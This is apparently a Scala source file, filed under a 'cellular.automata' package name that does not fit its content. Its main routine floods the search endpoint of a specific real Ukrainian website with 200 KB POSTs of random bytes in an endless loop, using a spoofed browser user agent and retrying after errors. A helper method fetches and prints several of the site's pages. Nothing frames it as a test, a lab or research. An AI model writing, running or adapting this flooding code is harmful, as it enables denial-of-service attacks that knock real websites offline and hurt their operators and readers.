package cellular.automata

import java.net.URL
import java.net.HttpURLConnection
import java.io.{ InputStream, OutputStream, BufferedReader, InputStreamReader}
import scala.util.Random

object Pingas {
  
  val url = new URL("http://vybor-ua.org.ua/Mneniya/");
  
  val urlList = new URL("http://vybor-ua.org.ua/Mneniya/?author=1410768") ::
	  			new URL("http://vybor-ua.org.ua/Razdelyi-sayta/Dvizheniya-227.html") ::
	  			new URL("http://vybor-ua.org.ua/Razdelyi-sayta/Dvizheniya-2271.html") ::
	  			new URL("http://vybor-ua.org.ua/Publikatsii/") ::
	  			new URL("http://vybor-ua.org.ua/Publikatsii/") :: Nil
  
  val header = Map("Accept-Encoding" -> "deflate", "Connection" -> "keep-alive", "User-Agent"->"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0")

  def main(args: Array[String]): Unit = {
    
   
      doSomePosts() 
    
    
    
  }
  
  def printOutput(input : BufferedReader) : Unit = Option(input.readLine()) match {
    case Some(l) => println(l); printOutput(input);
    case None => 
  }
  
  def doSomePosts() {
    val url = new URL("http://vybor-ua.org.ua/Search.html")
    val array = new Array[Byte](200000);
    val rand = new Random();
    rand.nextBytes(array)
    
    while(true) {
    try {
        val con = url.openConnection.asInstanceOf[HttpURLConnection]
        //con.setRequestProperty("Header", "Value")
        for (h <- header) {
          con.setRequestProperty(h._1, h._2);
        }

        con.setDoInput(true)
        con.setDoOutput(true)
        con.setUseCaches(false)
        con.setRequestMethod("POST");
        
        val out = con.getOutputStream();
        out.write(array);
        out.flush()
    } catch {
      case e : Exception => e.printStackTrace(); Thread.sleep(5000);
    }
    }
  }

  def getUrls() {

    for (url <- urlList) {
      try {
        val con = url.openConnection.asInstanceOf[HttpURLConnection]
        //con.setRequestProperty("Header", "Value")
        for (h <- header) {
          con.setRequestProperty(h._1, h._2);
        }

        con.setDoInput(true)
        con.setDoOutput(true)
        con.setUseCaches(false)
        con.setRequestMethod("GET");

        val inStream = con.getInputStream();
        val input = new BufferedReader(new InputStreamReader(inStream));

        printOutput(input);

      } catch {
        case e: Exception => println("oops, probably 404");
      }
    }
  }

}
